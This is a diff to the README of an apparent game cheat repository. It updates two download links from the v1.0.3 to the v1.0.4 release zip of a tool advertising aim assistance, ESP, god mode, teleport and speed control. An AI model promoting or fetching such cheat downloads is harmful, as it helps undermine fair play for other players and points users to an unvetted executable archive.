@@ -10,7 +10,7 @@ Aim Assistance · ESP · God Mode · Teleport · Speed Control · Auto Paint
 ---
 
 <p align="center">
-  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.3/MecchaAutoPainter.zip">
+  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.4/MecchaAutoPainter.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
   </a>
 </p>
@@ -64,7 +64,7 @@ Aim Assistance · ESP · God Mode · Teleport · Speed Control · Auto Paint
 
 ## ⚙️ Installation
 <p align="left">
-  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.3/MecchaAutoPainter.zip">
+  <a href="https://github.com/falscriptor/Meccha-Chameleon-Tool/releases/download/v1.0.4/MecchaAutoPainter.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
   </a>
 </p>
